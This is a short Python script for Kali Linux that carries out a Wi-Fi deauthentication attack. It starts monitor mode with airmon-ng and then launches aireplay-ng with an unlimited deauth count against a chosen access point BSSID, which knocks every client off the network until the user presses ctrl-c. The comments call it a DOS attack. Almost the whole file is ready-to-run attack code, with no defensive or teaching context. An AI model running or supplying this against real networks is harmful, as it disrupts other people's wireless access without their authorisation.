
import os
# We require regular expressions.
import re
# We will be using the subprocess module to run commands on Kali Linux.
import subprocess
from scapy.all import *
from scapy.layers.l2 import ARP, Ether

# hackchannel hackbssid -data we need from the active_wireless_networks
#hackbssid = active_wireless_networks[int(choice)]["BSSID"]
#hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
def deautentication_user( hacknic , hackbssid ,hackchannel):

    # Change to the channel we want to perform the DOS attack on.
    # Monitoring takes place on a different channel and we need to set it to that channel.
    subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

    # Deauthenticate clients. We run it with Popen and we send the output to subprocess.DEVNULL and the errors to subprocess.DEVNULL. We will thus run deauthenticate in the background.
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # We run an infinite loop which you can quit by presses ctrl-c. The deauthentication will stop when we stop the script.
    try:
        while True:
            print("Deauthenticating clients, press ctrl-c to stop")
    except KeyboardInterrupt:
        print("Stop monitoring mode")
        # We run a subprocess.run command where we stop monitoring mode on the network adapter.
        subprocess.run(["airmon-ng", "stop", hacknic + "mon"])
        print("Thank you! Exiting now")